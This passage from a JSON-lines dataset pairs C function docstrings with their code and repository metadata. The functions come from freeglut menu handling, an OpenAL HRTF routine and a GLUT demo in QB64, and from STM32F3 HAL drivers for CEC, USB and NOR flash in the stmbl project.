"QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * A.Donev: Set and retrieve the menu's user data\n */\n", "func_signal": "void* FGAPIENTRY glutGetMenuData( void )", "code": "{\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutGetMenuData\" );\n    return fgStructure.CurrentMenu->UserData;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Private function to get the virtual maximum screen extent\n */\n", "func_signal": "static GLvoid fghGetVMaxExtent( SFG_Window* window, int* x, int* y )", "code": "{\n    if( fgStructure.GameModeWindow )\n    {\n#if TARGET_HOST_POSIX_X11\n        int wx, wy;\n        Window w;\n\n        XTranslateCoordinates(\n            fgDisplay.Display,\n            window->Window.Handle,\n            fgDisplay.RootWindow,\n            0, 0, &wx, &wy, &w);\n\n        *x = fgState.GameModeSize.X + wx;\n        *y = fgState.GameModeSize.Y + wy;\n#else\n        *x = glutGet ( GLUT_SCREEN_WIDTH );\n        *y = glutGet ( GLUT_SCREEN_HEIGHT );\n#endif\n    }\n    else\n    {\n        *x = fgDisplay.ScreenWidth;\n        *y = fgDisplay.ScreenHeight;\n    }\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Adds a menu entry to the bottom of the current menu\n */\n", "func_signal": "void FGAPIENTRY glutAddMenuEntry( const char* label, int value )", "code": "{\n    SFG_MenuEntry* menuEntry;\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutAddMenuEntry\" );\n    menuEntry = (SFG_MenuEntry *)calloc( sizeof(SFG_MenuEntry), 1 );\n    freeglut_return_if_fail( fgStructure.CurrentMenu );\n\n    menuEntry->Text = strdup( label );\n    menuEntry->ID   = value;\n\n    /* Have the new menu entry attached to the current menu */\n    fgListAppend( &fgStructure.CurrentMenu->Entries, &menuEntry->Node );\n\n    fghCalculateMenuBoxSize( );\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*!\n    Does printf()-like work using freeglut/OpenGLUT\n    glutBitmapString().  Uses a fixed font.  Prints\n    at the indicated row/column position.\n\n    Limitation: Cannot address pixels.\n    Limitation: Renders in screen coords, not model coords.\n*/\n", "func_signal": "static void shapesPrintf (int row, int col, const char *fmt, ...)", "code": "{\n    static char buf[256];\n    int viewport[4];\n    void *font = GLUT_BITMAP_9_BY_15;\n    va_list args;\n\n    va_start(args, fmt);\n#if defined(WIN32) && !defined(__CYGWIN__)\n    (void) _vsnprintf (buf, sizeof(buf), fmt, args);\n#else\n    (void) vsnprintf (buf, sizeof(buf), fmt, args);\n#endif\n    va_end(args);\n\n    glGetIntegerv(GL_VIEWPORT,viewport);\n\n    glPushMatrix();\n    glLoadIdentity();\n\n    glMatrixMode(GL_PROJECTION);\n    glPushMatrix();\n    glLoadIdentity();\n\n        glOrtho(0,viewport[2],0,viewport[3],-1,1);\n\n        glRasterPos2i\n        (\n              glutBitmapWidth(font, ' ') * col,\n            - glutBitmapHeight(font) * (row+2) + viewport[3]\n        );\n        glutBitmapString (font, (unsigned char*)buf);\n\n    glPopMatrix();\n    glMatrixMode(GL_MODELVIEW);\n    glPopMatrix();\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/progs/demos/shapes/shapes.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Deactivates a menu pointed by the function argument.\n */\n", "func_signal": "void fgDeactivateMenu( SFG_Window *window )", "code": "{\n    SFG_Window *parent_window = NULL;\n\n    /* Check if there is an active menu attached to this window... */\n    SFG_Menu* menu = window->ActiveMenu;\n    SFG_MenuEntry *menuEntry;\n\n    /* Did we find an active window? */\n    freeglut_return_if_fail( menu );\n\n    parent_window = menu->ParentWindow;\n\n    /* Hide the present menu's window */\n    fgSetWindow( menu->Window );\n    glutHideWindow( );\n\n    /* Forget about having that menu active anymore, now: */\n    menu->Window->ActiveMenu = NULL;\n    menu->ParentWindow->ActiveMenu = NULL;\n    fghSetMenuParentWindow ( NULL, menu );\n    menu->IsActive = GL_FALSE;\n    menu->ActiveEntry = NULL;\n\n    fgState.ActiveMenus--;\n\n    /* Hide all submenu windows, and the root menu's window. */\n    for ( menuEntry = ( SFG_MenuEntry * )menu->Entries.First;\n          menuEntry;\n          menuEntry = ( SFG_MenuEntry * )menuEntry->Node.Next )\n    {\n        menuEntry->IsActive = GL_FALSE;\n\n        /* Is that an active submenu by any case? */\n        if( menuEntry->SubMenu )\n            fghDeactivateSubMenu( menuEntry );\n    }\n\n    fgSetWindow ( parent_window ) ;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Check whether an active menu absorbs a mouse click\n */\n", "func_signal": "GLboolean fgCheckActiveMenu ( SFG_Window *window, int button, GLboolean pressed,\n                              int mouse_x, int mouse_y )", "code": "{\n    /*\n     * Near as I can tell, this is the menu behaviour:\n     *  - Down-click the menu button, menu not active:  activate\n     *    the menu with its upper left-hand corner at the mouse\n     *    location.\n     *  - Down-click any button outside the menu, menu active:\n     *    deactivate the menu\n     *  - Down-click any button inside the menu, menu active:\n     *    select the menu entry and deactivate the menu\n     *  - Up-click the menu button, menu not active:  nothing happens\n     *  - Up-click the menu button outside the menu, menu active:\n     *    nothing happens\n     *  - Up-click the menu button inside the menu, menu active:\n     *    select the menu entry and deactivate the menu\n     * Since menus can have submenus, we need to check this recursively.\n     */\n    if( window->ActiveMenu )\n    {\n        if( window == window->ActiveMenu->ParentWindow )\n        {\n            window->ActiveMenu->Window->State.MouseX =\n                                       mouse_x - window->ActiveMenu->X;\n            window->ActiveMenu->Window->State.MouseY =\n                                       mouse_y - window->ActiveMenu->Y;\n        }\n\n        /* In the menu, invoke the callback and deactivate the menu */\n        if( fghCheckMenuStatus( window->ActiveMenu ) )\n        {\n            /*\n             * Save the current window and menu and set the current\n             * window to the window whose menu this is\n             */\n            SFG_Window *save_window = fgStructure.CurrentWindow;\n            SFG_Menu *save_menu = fgStructure.CurrentMenu;\n            SFG_Window *parent_window = window->ActiveMenu->ParentWindow;\n            fgSetWindow( parent_window );\n            fgStructure.CurrentMenu = window->ActiveMenu;\n\n            /* Execute the menu callback */\n            fghExecuteMenuCallback( window->ActiveMenu );\n            fgDeactivateMenu( parent_window );\n\n            /* Restore the current window and menu */\n            fgSetWindow( save_window );\n            fgStructure.CurrentMenu = save_menu;\n        }\n        else if( pressed )\n            /*\n             * Outside the menu, deactivate if it's a downclick\n             *\n             * XXX This isn't enough.  A downclick outside of\n             * XXX the interior of our freeglut windows should also\n             * XXX deactivate the menu.  This is more complicated.\n             */\n            fgDeactivateMenu( window->ActiveMenu->ParentWindow );\n\n        /*\n         * XXX Why does an active menu require a redisplay at\n         * XXX this point?  If this can come out cleanly, then\n         * XXX it probably should do so; if not, a comment should\n         * XXX explain it.\n         */\n        if( ! window->IsMenu )\n            window->State.Redisplay = GL_TRUE;\n\n        return GL_TRUE;\n    }\n\n    /* No active menu, let's check whether we need to activate one. */\n    if( ( 0 <= button ) &&\n        ( FREEGLUT_MAX_MENUS > button ) &&\n        ( window->Menu[ button ] ) &&\n        pressed )\n    {\n        /* XXX Posting a requisite Redisplay seems bogus. */\n        window->State.Redisplay = GL_TRUE;\n        fghActivateMenu( window, button );\n        return GL_TRUE;\n    }\n\n    return GL_FALSE;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Deactivates a menu pointed by the function argument.\n */\n", "func_signal": "static void fghDeactivateSubMenu( SFG_MenuEntry *menuEntry )", "code": "{\n    SFG_MenuEntry *subMenuIter;\n    /* Hide the present menu's window */\n    fgSetWindow( menuEntry->SubMenu->Window );\n    glutHideWindow( );\n\n    /* Forget about having that menu active anymore, now: */\n    menuEntry->SubMenu->Window->ActiveMenu = NULL;\n    menuEntry->SubMenu->IsActive = GL_FALSE;\n    menuEntry->SubMenu->ActiveEntry = NULL;\n\n    /* Hide all submenu windows, and the root menu's window. */\n    for ( subMenuIter = (SFG_MenuEntry *)menuEntry->SubMenu->Entries.First;\n          subMenuIter;\n          subMenuIter = (SFG_MenuEntry *)subMenuIter->Node.Next )\n    {\n        subMenuIter->IsActive = GL_FALSE;\n\n        /* Is that an active submenu by any case? */\n        if( subMenuIter->SubMenu )\n            fghDeactivateSubMenu( subMenuIter );\n    }\n\n    fgSetWindow ( menuEntry->SubMenu->ParentWindow ) ;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "// Calculates the normalized HRTF transition factor (delta) from the changes\n// in gain and listener to source angle between updates.  The result is a\n// normalized delta factor than can be used to calculate moving HRIR stepping\n// values.\n", "func_signal": "ALfloat CalcHrtfDelta(ALfloat oldGain, ALfloat newGain, const ALfloat olddir[3], const ALfloat newdir[3])", "code": "{\n    ALfloat gainChange, angleChange, change;\n\n    // Calculate the normalized dB gain change.\n    newGain = maxf(newGain, 0.0001f);\n    oldGain = maxf(oldGain, 0.0001f);\n    gainChange = aluFabs(aluLog10(newGain / oldGain) / aluLog10(0.0001f));\n\n    // Calculate the normalized listener to source angle change when there is\n    // enough gain to notice it.\n    angleChange = 0.0f;\n    if(gainChange > 0.0001f || newGain > 0.0001f)\n    {\n        // No angle change when the directions are equal or degenerate (when\n        // both have zero length).\n        if(newdir[0]-olddir[0] || newdir[1]-olddir[1] || newdir[2]-olddir[2])\n            angleChange = aluAcos(olddir[0]*newdir[0] +\n                                  olddir[1]*newdir[1] +\n                                  olddir[2]*newdir[2]) / F_PI;\n\n    }\n\n    // Use the largest of the two changes for the delta factor, and apply a\n    // significance shaping function to it.\n    change = maxf(angleChange, gainChange) * 2.0f;\n    return minf(change, 1.0f);\n}", "path": "qb64/internal/c/parts/audio/out/download/openal-soft-1.14/Alc/hrtf.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Changes the specified menu item in the current menu into a menu entry\n */\n", "func_signal": "void FGAPIENTRY glutChangeToMenuEntry( int item, const char* label, int value )", "code": "{\n    SFG_MenuEntry* menuEntry = NULL;\n\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutChangeToMenuEntry\" );\n    freeglut_return_if_fail( fgStructure.CurrentMenu );\n\n    /* Get n-th menu entry in the current menu, starting from one: */\n    menuEntry = fghFindMenuEntry( fgStructure.CurrentMenu, item );\n\n    freeglut_return_if_fail( menuEntry );\n\n    /* We want it to become a normal menu entry, so: */\n    if( menuEntry->Text )\n        free( menuEntry->Text );\n\n    menuEntry->Text    = strdup( label );\n    menuEntry->ID      = value;\n    menuEntry->SubMenu = NULL;\n    fghCalculateMenuBoxSize( );\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Activates a menu pointed by the function argument\n */\n", "func_signal": "static void fghActivateMenu( SFG_Window* window, int button )", "code": "{\n    int max_x, max_y;\n\n    /* We'll be referencing this menu a lot, so remember its address: */\n    SFG_Menu* menu = window->Menu[ button ];\n    SFG_Window* current_window = fgStructure.CurrentWindow;\n\n    /* If the menu is already active in another window, deactivate it there */\n    if ( menu->ParentWindow )\n      menu->ParentWindow->ActiveMenu = NULL ;\n\n    /* Mark the menu as active, so that it gets displayed: */\n    window->ActiveMenu = menu;\n    menu->IsActive = GL_TRUE;\n    fghSetMenuParentWindow ( window, menu );\n    fgState.ActiveMenus++;\n\n    /* Set up the initial menu position now: */\n    fghGetVMaxExtent(menu->ParentWindow, &max_x, &max_y);\n    fgSetWindow( window );\n    menu->X = window->State.MouseX + glutGet( GLUT_WINDOW_X );\n    menu->Y = window->State.MouseY + glutGet( GLUT_WINDOW_Y );\n\n    if( menu->X + menu->Width > max_x )\n        menu->X -=menu->Width;\n\n    if( menu->Y + menu->Height > max_y )\n    {\n        menu->Y -=menu->Height;\n        if( menu->Y < 0 )\n            menu->Y = 0;\n    }\n\n    menu->Window->State.MouseX =\n        window->State.MouseX + glutGet( GLUT_WINDOW_X ) - menu->X;\n    menu->Window->State.MouseY =\n        window->State.MouseY + glutGet( GLUT_WINDOW_Y ) - menu->Y;\n\n    fgSetWindow( menu->Window );\n    glutPositionWindow( menu->X, menu->Y );\n    glutReshapeWindow( menu->Width, menu->Height );\n    glutPopWindow( );\n    glutShowWindow( );\n    menu->Window->ActiveMenu = menu;\n    fghCheckMenuStatus( menu );\n    fgSetWindow( current_window );\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Private static function to set the parent window of a submenu and all\n * of its submenus\n */\n", "func_signal": "static void fghSetMenuParentWindow( SFG_Window *window, SFG_Menu *menu )", "code": "{\n    SFG_MenuEntry *menuEntry;\n\n    menu->ParentWindow = window;\n\n    for( menuEntry = ( SFG_MenuEntry * )menu->Entries.First;\n         menuEntry;\n         menuEntry = ( SFG_MenuEntry * )menuEntry->Node.Next )\n        if( menuEntry->SubMenu )\n            fghSetMenuParentWindow( window, menuEntry->SubMenu );\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Detaches a menu from the current window\n */\n", "func_signal": "void FGAPIENTRY glutDetachMenu( int button )", "code": "{\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutDetachMenu\" );\n\n    freeglut_return_if_fail( fgStructure.CurrentWindow );\n    freeglut_return_if_fail( fgStructure.CurrentMenu );\n\n    freeglut_return_if_fail( button >= 0 );\n    freeglut_return_if_fail( button < FREEGLUT_MAX_MENUS );\n\n    fgStructure.CurrentWindow->Menu[ button ] = NULL;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Private function to check for the current menu/sub menu activity state\n */\n", "func_signal": "static GLboolean fghCheckMenuStatus( SFG_Menu* menu )", "code": "{\n    SFG_MenuEntry* menuEntry;\n    int x, y;\n\n    /* First of all check any of the active sub menus... */\n    for( menuEntry = (SFG_MenuEntry *)menu->Entries.First;\n         menuEntry;\n         menuEntry = (SFG_MenuEntry *)menuEntry->Node.Next )\n    {\n        if( menuEntry->SubMenu && menuEntry->IsActive )\n        {\n            /*\n             * OK, have the sub-menu checked, too. If it returns GL_TRUE, it\n             * will mean that it caught the mouse cursor and we do not need\n             * to regenerate the activity list, and so our parents do...\n             */\n            GLboolean return_status;\n\n            menuEntry->SubMenu->Window->State.MouseX =\n                menu->Window->State.MouseX + menu->X - menuEntry->SubMenu->X;\n            menuEntry->SubMenu->Window->State.MouseY =\n                menu->Window->State.MouseY + menu->Y - menuEntry->SubMenu->Y;\n            return_status = fghCheckMenuStatus( menuEntry->SubMenu );\n\n            if ( return_status )\n                return GL_TRUE;\n        }\n    }\n\n    /* That much about our sub menus, let's get to checking the current menu: */\n    x = menu->Window->State.MouseX;\n    y = menu->Window->State.MouseY;\n\n    /* Check if the mouse cursor is contained within the current menu box */\n    if( ( x >= FREEGLUT_MENU_BORDER ) &&\n        ( x < menu->Width  - FREEGLUT_MENU_BORDER ) &&\n        ( y >= FREEGLUT_MENU_BORDER ) &&\n        ( y < menu->Height - FREEGLUT_MENU_BORDER )  )\n    {\n        int menuID = ( y - FREEGLUT_MENU_BORDER ) / FREEGLUT_MENU_HEIGHT;\n\n        /* The mouse cursor is somewhere over our box, check it out. */\n        menuEntry = fghFindMenuEntry( menu, menuID + 1 );\n        FREEGLUT_INTERNAL_ERROR_EXIT( menuEntry, \"Cannot find menu entry\",\n                                      \"fghCheckMenuStatus\" );\n\n        menuEntry->IsActive = GL_TRUE;\n        menuEntry->Ordinal = menuID;\n\n        /*\n         * If this is not the same as the last active menu entry, deactivate\n         * the previous entry.  Specifically, if the previous active entry\n         * was a submenu then deactivate it.\n         */\n        if( menu->ActiveEntry && ( menuEntry != menu->ActiveEntry ) )\n            if( menu->ActiveEntry->SubMenu )\n                fghDeactivateSubMenu( menu->ActiveEntry );\n\n        if( menuEntry != menu->ActiveEntry )\n        {\n            menu->Window->State.Redisplay = GL_TRUE;\n            if( menu->ActiveEntry )\n                menu->ActiveEntry->IsActive = GL_FALSE;\n        }\n\n        menu->ActiveEntry = menuEntry;\n        menu->IsActive = GL_TRUE;  /* XXX Do we need this? */\n\n        /*\n         * OKi, we have marked that entry as active, but it would be also\n         * nice to have its contents updated, in case it's a sub menu.\n         * Also, ignore the return value of the check function:\n         */\n        if( menuEntry->SubMenu )\n        {\n            if ( ! menuEntry->SubMenu->IsActive )\n            {\n                int max_x, max_y;\n                SFG_Window *current_window = fgStructure.CurrentWindow;\n\n                /* Set up the initial menu position now... */\n                menuEntry->SubMenu->IsActive = GL_TRUE;\n\n                /* Set up the initial submenu position now: */\n                fghGetVMaxExtent(menu->ParentWindow, &max_x, &max_y);\n                menuEntry->SubMenu->X = menu->X + menu->Width;\n                menuEntry->SubMenu->Y = menu->Y +\n                    menuEntry->Ordinal * FREEGLUT_MENU_HEIGHT;\n\n                if( menuEntry->SubMenu->X + menuEntry->SubMenu->Width > max_x )\n                    menuEntry->SubMenu->X = menu->X - menuEntry->SubMenu->Width;\n\n                if( menuEntry->SubMenu->Y + menuEntry->SubMenu->Height > max_y )\n                {\n                    menuEntry->SubMenu->Y -= ( menuEntry->SubMenu->Height -\n                                               FREEGLUT_MENU_HEIGHT -\n                                               2 * FREEGLUT_MENU_BORDER );\n                    if( menuEntry->SubMenu->Y < 0 )\n                        menuEntry->SubMenu->Y = 0;\n                }\n\n                fgSetWindow( menuEntry->SubMenu->Window );\n                glutPositionWindow( menuEntry->SubMenu->X,\n                                    menuEntry->SubMenu->Y );\n                glutReshapeWindow( menuEntry->SubMenu->Width,\n                                   menuEntry->SubMenu->Height );\n                glutPopWindow( );\n                glutShowWindow( );\n                menuEntry->SubMenu->Window->ActiveMenu = menuEntry->SubMenu;\n                fgSetWindow( current_window );\n                menuEntry->SubMenu->Window->State.MouseX =\n                    x + menu->X - menuEntry->SubMenu->X;\n                menuEntry->SubMenu->Window->State.MouseY =\n                    y + menu->Y - menuEntry->SubMenu->Y;\n                fghCheckMenuStatus( menuEntry->SubMenu );\n            }\n\n            /* Activate it because its parent entry is active */\n            menuEntry->SubMenu->IsActive = GL_TRUE;  /* XXX Do we need this? */\n        }\n\n        /* Report back that we have caught the menu cursor */\n        return GL_TRUE;\n    }\n\n    /* Looks like the menu cursor is somewhere else... */\n    if( menu->ActiveEntry && menu->ActiveEntry->IsActive &&\n        ( !menu->ActiveEntry->SubMenu ||\n          !menu->ActiveEntry->SubMenu->IsActive ) )\n    {\n        menu->Window->State.Redisplay = GL_TRUE;\n        menu->ActiveEntry->IsActive = GL_FALSE;\n        menu->ActiveEntry = NULL;\n    }\n\n    return GL_FALSE;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/* GLUT callback Handlers */\n", "func_signal": "static void\nresize(int width, int height)", "code": "{\n    const float ar = (float) width / (float) height;\n\n    glViewport(0, 0, width, height);\n\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    glFrustum(-ar, ar, -1.0, 1.0, 2.0, 100.0);\n\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity() ;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/progs/demos/shapes/shapes.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Recalculates current menu's box size\n */\n", "func_signal": "void fghCalculateMenuBoxSize( void )", "code": "{\n    SFG_MenuEntry* menuEntry;\n    int width = 0, height = 0;\n\n    /* Make sure there is a current menu set */\n    freeglut_return_if_fail( fgStructure.CurrentMenu );\n\n    /* The menu's box size depends on the menu entries: */\n    for( menuEntry = ( SFG_MenuEntry * )fgStructure.CurrentMenu->Entries.First;\n         menuEntry;\n         menuEntry = ( SFG_MenuEntry * )menuEntry->Node.Next )\n    {\n        /* Update the menu entry's width value */\n        menuEntry->Width = glutBitmapLength(\n            FREEGLUT_MENU_FONT,\n            (unsigned char *)menuEntry->Text\n        );\n\n        /*\n         * If the entry is a submenu, then it needs to be wider to\n         * accomodate the arrow. JCJ 31 July 2003\n         */\n        if (menuEntry->SubMenu )\n            menuEntry->Width += glutBitmapLength(\n                FREEGLUT_MENU_FONT,\n                (unsigned char *)\"_\"\n            );\n\n        /* Check if it's the biggest we've found */\n        if( menuEntry->Width > width )\n            width = menuEntry->Width;\n\n        height += FREEGLUT_MENU_HEIGHT;\n    }\n\n    /* Store the menu's box size now: */\n    fgStructure.CurrentMenu->Height = height + 2 * FREEGLUT_MENU_BORDER;\n    fgStructure.CurrentMenu->Width  = width  + 4 * FREEGLUT_MENU_BORDER;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/**\n  * @brief Rx Transfer completed callback\n  * @param hcec CEC handle\n  * @param RxFrameSize Size of frame\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_CEC_RxCpltCallback(CEC_HandleTypeDef *hcec, uint32_t RxFrameSize)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hcec);\n  UNUSED(RxFrameSize);\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_CEC_RxCpltCallback can be implemented in the user file\n   */\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_cec.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Stop the USB device.\n  * @param  hpcd PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_Stop(PCD_HandleTypeDef *hpcd)", "code": "{ \n  __HAL_LOCK(hpcd); \n  \n    /* disable all interrupts and force USB reset */\n  hpcd->Instance->CNTR = USB_CNTR_FRES;\n  \n  /* clear interrupt status register */\n  hpcd->Instance->ISTR = 0U;\n  \n  /* switch-off device */\n  hpcd->Instance->CNTR = (USB_CNTR_FRES | USB_CNTR_PDWN);\n  \n  __HAL_UNLOCK(hpcd); \n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Read NOR flash CFI IDs\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @param  pNOR_CFI pointer to NOR CFI IDs structure  \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_Read_CFI(NOR_HandleTypeDef *hnor, NOR_CFITypeDef *pNOR_CFI)", "code": "{\n  uint32_t deviceaddress = 0U;\n  \n  /* Process Locked */\n  __HAL_LOCK(hnor);\n  \n  /* Check the NOR controller state */\n  if(hnor->State == HAL_NOR_STATE_BUSY)\n  {\n     return HAL_BUSY;\n  }\n    \n  /* Select the NOR device address */\n  if (hnor->Init.NSBank == FMC_NORSRAM_BANK1)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS1;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK2)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS2;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK3)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS3;\n  }\n  else /* FMC_NORSRAM_BANK4 */\n  {\n    deviceaddress = NOR_MEMORY_ADRESS4;\n  }  \n    \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_BUSY;\n  \n  /* Send read CFI query command */\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FIRST_CFI), NOR_CMD_DATA_CFI);\n\n  /* read the NOR CFI information */\n  pNOR_CFI->CFI_1 = *(__IO uint16_t *) NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, CFI1_ADDRESS);\n  pNOR_CFI->CFI_2 = *(__IO uint16_t *) NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, CFI2_ADDRESS);\n  pNOR_CFI->CFI_3 = *(__IO uint16_t *) NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, CFI3_ADDRESS);\n  pNOR_CFI->CFI_4 = *(__IO uint16_t *) NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, CFI4_ADDRESS);\n\n  /* Check the NOR controller state */\n  hnor->State = HAL_NOR_STATE_READY;\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor);\n  \n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  DeInitializes the PCD peripheral \n  * @param  hpcd PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_DeInit(PCD_HandleTypeDef *hpcd)", "code": "{\n  /* Check the PCD handle allocation */\n  if(hpcd == NULL)\n  {\n    return HAL_ERROR;\n  }\n\n  hpcd->State = HAL_PCD_STATE_BUSY;\n  \n  /* Stop Device */\n  HAL_PCD_Stop(hpcd);\n    \n  /* DeInit the low level hardware */\n  HAL_PCD_MspDeInit(hpcd);\n  \n  hpcd->State = HAL_PCD_STATE_RESET; \n  \n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Data out stage callbacks\n  * @param  hpcd PCD handle\n  * @param  epnum endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_DataOutStageCallback could be implemented in the user file\n   */ \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Returns the NOR operation status.\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.   \n  * @param  Address Device address\n  * @param  Timeout NOR progamming Timeout\n  * @retval NOR_Status: The returned value can be: HAL_NOR_STATUS_SUCCESS, HAL_NOR_STATUS_ERROR\n  *         or HAL_NOR_STATUS_TIMEOUT\n  */\n", "func_signal": "HAL_NOR_StatusTypeDef HAL_NOR_GetStatus(NOR_HandleTypeDef *hnor, uint32_t Address, uint32_t Timeout)", "code": "{ \n  HAL_NOR_StatusTypeDef status = HAL_NOR_STATUS_ONGOING;\n  uint16_t tmp_sr1 = 0U, tmp_sr2 = 0U;\n  uint32_t tickstart = 0U;\n\n  /* Poll on NOR memory Ready/Busy signal ------------------------------------*/\n  HAL_NOR_MspWait(hnor, Timeout);\n  \n  /* Get tick */\n  tickstart = HAL_GetTick();\n  while((status != HAL_NOR_STATUS_SUCCESS) && (status != HAL_NOR_STATUS_TIMEOUT))\n  {\n    /* Check for the Timeout */\n    if(Timeout != HAL_MAX_DELAY)\n    {\n      if((Timeout == 0U)||((HAL_GetTick() - tickstart ) > Timeout))\n    {\n      status = HAL_NOR_STATUS_TIMEOUT; \n    }  \n    } \n    \n    /* Read NOR status register (DQ6 and DQ5) */\n    tmp_sr1 = *(__IO 